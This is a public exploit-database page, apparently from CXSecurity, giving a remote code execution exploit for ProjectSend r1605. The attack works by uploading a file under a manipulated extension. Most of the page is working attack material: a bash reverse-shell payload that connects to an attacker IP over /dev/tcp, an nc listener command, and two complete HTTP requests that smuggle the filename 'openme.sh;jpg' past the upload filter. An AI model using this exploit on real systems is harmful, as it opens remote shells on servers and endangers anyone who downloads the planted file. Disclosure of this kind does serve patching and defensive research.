---
title: projectSend r1605 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-06
fetch_date: 2025-10-04T11:29:58.530916
---

# projectSend r1605 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **projectSend r1605 Remote Code Execution** **2023.04.05**  Credit:  **[Mirabbas Agalarov](https://cxsecurity.com/author/Mirabbas%2BAgalarov/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Exploit Title: projectSend r1605 - Remote Code Exectution RCE
Application: projectSend
Version: r1605
Bugs: rce via file extension manipulation
Technology: PHP
Vendor URL: https://www.projectsend.org/
Software Link: https://www.projectsend.org/
Date of found: 26-01-2023
Author: Mirabbas Ağalarov
Tested on: Linux
POC video: https://youtu.be/Ln7KluDfnk4
2. Technical Details & POC
========================================
1.The attacker first creates a txt file and pastes the following code. Next, the Attacker changes the file extension to jpg. Because the system php,sh,exe etc. It does not allow files.
bash -i >& /dev/tcp/192.168.100.18/4444 0>&1
2.Then the attacker starts listening for ip and port
nc -lvp 4444
3.and when uploading file it makes http request as below.file name should be like this openme.sh;jpg
POST /includes/upload.process.php HTTP/1.1
Host: localhost
Content-Length: 525
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0enbZuQQAtahFVjI
Accept: \*/\*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/upload.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: download\_started=false; PHPSESSID=jtk7d0nats7nb1r5rjm7a6kj59
Connection: close
------WebKitFormBoundary0enbZuQQAtahFVjI
Content-Disposition: form-data; name="name"
openme.sh;jpg
------WebKitFormBoundary0enbZuQQAtahFVjI
Content-Disposition: form-data; name="chunk"
0
------WebKitFormBoundary0enbZuQQAtahFVjI
Content-Disposition: form-data; name="chunks"
1
------WebKitFormBoundary0enbZuQQAtahFVjI
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream
bash -i >& /dev/tcp/192.168.100.18/4444 0>&1
------WebKitFormBoundary0enbZuQQAtahFVjI--
4.In the second request, we do this to the filename section at the bottom.
openme.sh
POST /files-edit.php?ids=34 HTTP/1.1
Host: localhost
Content-Length: 1016
Cache-Control: max-age=0
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc8btjvyb3An7HcmA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/files-edit.php?ids=34&type=new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: download\_started=false; PHPSESSID=jtk7d0nats7nb1r5rjm7a6kj59
Connection: close
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="csrf\_token"
66540808a4bd64c0f0566e6c20a4bc36c49dfac41172788424c6924b15b18d02
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="file[1][id]"
34
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="file[1][original]"
openme.sh;.jpg
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="file[1][file]"
1674759035-52e51cf3f58377b8a687d49b960a58dfc677f0ad-openmesh.jpg
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="file[1][name]"
openme.sh
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="file[1][description]"
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="file[1][expiry\_date]"
25-02-2023
------WebKitFormBoundaryc8btjvyb3An7HcmA
Content-Disposition: form-data; name="save"
------WebKitFormBoundaryc8btjvyb3An7HcmA--
And it doesn't matter who downloads your file. if it opens then reverse shell will be triggered and rce
private youtube video poc : https://youtu.be/Ln7KluDfnk4

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 3
 -1

75%

25%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top